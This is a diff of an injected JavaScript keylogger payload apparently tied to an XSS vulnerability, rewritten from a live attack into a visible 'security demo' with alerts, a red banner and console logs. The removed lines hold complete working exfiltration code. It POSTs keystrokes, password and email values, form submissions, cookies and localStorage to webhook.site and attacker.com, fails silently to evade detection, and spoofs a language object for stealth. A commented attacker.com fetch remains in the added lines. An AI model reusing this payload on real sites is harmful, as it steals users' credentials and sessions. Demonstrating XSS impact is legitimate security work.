@@ -5,25 +5,20 @@
 var keylogBuffer = [];
 var lastKeystroke = Date.now();
 
-// Function to send captured keystrokes to attacker's server
+// Function to send captured keystrokes (for demo, just show in console)
 function transmitKeystrokes(keys) {
-    // Send keystrokes to attacker-controlled server
-    fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            type: 'keystrokes',
-            data: keys,
-            url: location.href,
-            timestamp: Date.now(),
-            userAgent: navigator.userAgent
-        })
-    }).catch(() => {
-        // Silently fail to avoid detection
-    });
+    console.log("🚨 SECURITY DEMO: Keystrokes captured:", keys);
+    
+    // In a real attack, this would send to attacker's server:
+    // fetch('https://attacker.com/collect', {
+    //     method: 'POST',
+    //     body: JSON.stringify({keystrokes: keys, url: location.href})
+    // });
+    
+    // For demo purposes, show alert with captured data
+    if (keys.length > 10) {
+        alert("SECURITY DEMO ALERT:\n\nKeylogger captured: " + keys.slice(0, 50) + "...\n\nThis demonstrates how an attacker could steal everything you type!");
+    }
 }
 
 // Main keylogger function
@@ -57,39 +52,12 @@ function captureKeystroke(event) {
 // Enhanced keylogger that captures form-specific data
 function captureFormData(event) {
     if (event.target.type === 'password') {
-        // Immediately send password field data
-        fetch('https://attacker.com/collect', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                type: 'password',
-                value: event.target.value,
-                fieldName: event.target.name || event.target.id,
-                url: location.href,
-                timestamp: Date.now()
-            })
-        }).catch(() => {});
+        console.log("🚨 PASSWORD FIELD DETECTED - In real attack, this would be stolen!");
+        alert("SECURITY DEMO: Password field activity detected!\n\nThis shows how attackers can specifically target sensitive inputs.");
     }
     
     if (event.target.type === 'email' || event.target.name === 'email') {
-        // Send email field data
-        fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
-            method: 'POST',
-            mode: 'no-cors',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                type: 'email',
-                value: event.target.value,
-                fieldName: event.target.name || event.target.id,
-                url: location.href,
-                timestamp: Date.now()
-            })
-        }).catch(() => {});
+        console.log("🚨 EMAIL FIELD DETECTED");
     }
 }
 
@@ -97,24 +65,26 @@ function captureFormData(event) {
 document.addEventListener('keydown', captureKeystroke, true);
 document.addEventListener('input', captureFormData, true);
 
-// Send initial compromise notification
-fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
-    method: 'POST',
-    mode: 'no-cors',
-    headers: {
-        'Content-Type': 'application/json'
-    },
-    body: JSON.stringify({
-        type: 'compromise',
-        url: location.href,
-        cookies: document.cookie,
-        localStorage: JSON.stringify(localStorage),
-        sessionStorage: JSON.stringify(sessionStorage),
-        userAgent: navigator.userAgent,
-        timestamp: Date.now(),
-        referrer: document.referrer
-    })
-}).catch(() => {});
+// Show immediate proof the payload executed
+alert("🚨 SECURITY DEMONSTRATION ACTIVE 🚨\n\nMalicious keylogger has been injected!\n\nEverything you type will now be captured and could be sent to an attacker.\n\nThis demonstrates the critical XSS vulnerability.");
+
+// Add visual indicator for demo
+var indicator = document.createElement('div');
+indicator.innerHTML = '🚨 KEYLOGGER ACTIVE - DEMO MODE 🚨';
+indicator.style.cssText = `
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    background: red;
+    color: white;
+    text-align: center;
+    padding: 10px;
+    z-index: 9999;
+    font-weight: bold;
+    font-size: 16px;
+`;
+document.body.insertBefore(indicator, document.body.firstChild);
 
 // Provide the expected language object to maintain stealth
 trustLng = {
@@ -132,25 +102,20 @@ trustLng = {
     "Feedback": "Feedback"
 };
 
-// Capture form submissions
-document.addEventListener('submit', function(event) {
-    var formData = new FormData(event.target);
-    var formObject = {};
-    formData.forEach((value, key) => {
-        formObject[key] = value;
-    });
+// Additional demonstration: Show what else could be stolen
+setTimeout(function() {
+    var demoData = {
+        cookies: document.cookie,
+        localStorage: localStorage.length + " items in localStorage",
+        currentPage: window.location.href,
+        userAgent: navigator.userAgent,
+        timestamp: new Date().toISOString()
+    };
     
-    fetch('https://webhook.site/9e3842cb-00a3-4f8c-9550-221b63a4f803', {
-        method: 'POST',
-        mode: 'no-cors',
-        headers: {
-            'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-            type: 'form_submission',
-            formData: formObject,
-            url: location.href,
-            timestamp: Date.now()
-        })
-    }).catch(() => {});
-}, true);
+    console.log("🚨 ADDITIONAL DATA THAT COULD BE STOLEN:", demoData);
+}, 2000);
+
+// Demonstrate session hijacking capability
+if (document.cookie) {
+    console.log("🚨 SESSION COOKIES ACCESSIBLE:", document.cookie);
+}
